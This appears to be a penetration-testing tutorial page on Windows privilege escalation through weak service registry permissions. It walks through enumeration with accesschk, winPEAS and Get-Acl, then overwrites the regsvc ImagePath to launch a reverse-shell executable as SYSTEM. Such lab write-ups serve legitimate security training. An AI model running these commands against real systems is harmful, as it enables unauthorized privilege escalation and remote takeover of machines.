# Weak Registry Permissions

The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

```text
accesschk.exe -accepteula -wuvc "Everyone" *
accesschk.exe -accepteula -wuvc "Users" *
accesschk.exe -accepteula -wuvc "Authenticated Users" *
```

Run winPEAS to check for service misconfigurations:

```text
winPEASany.exe quiet servicesinfo
```

![](../../../../.gitbook/assets/image%20%2876%29.png)

Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:

```text
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

![](../../../../.gitbook/assets/image%20%2887%29.png)

Alternatively accesschk.exe can be used to confirm:

```text
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

![](../../../../.gitbook/assets/image%20%2894%29.png)

verify that we can start the service:

```text
accesschk.exe /accepteula -ucqv user regsvc
```

![](../../../../.gitbook/assets/image%20%28104%29.png)

now lets check the current value of the service registry entry:

```text
reg query HKLM\System\CurrentControlSet\Services\regsvc
```

![](../../../../.gitbook/assets/image%20%2899%29.png)

Overwrite the ImagePath registry key to point to our reverse shell executable:

```text
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

![](../../../../.gitbook/assets/image%20%2873%29.png)

Start a listener on Kali, and then start the service to trigger the exploit:

```text
 net start regsvc
```

![](../../../../.gitbook/assets/image%20%2895%29.png)





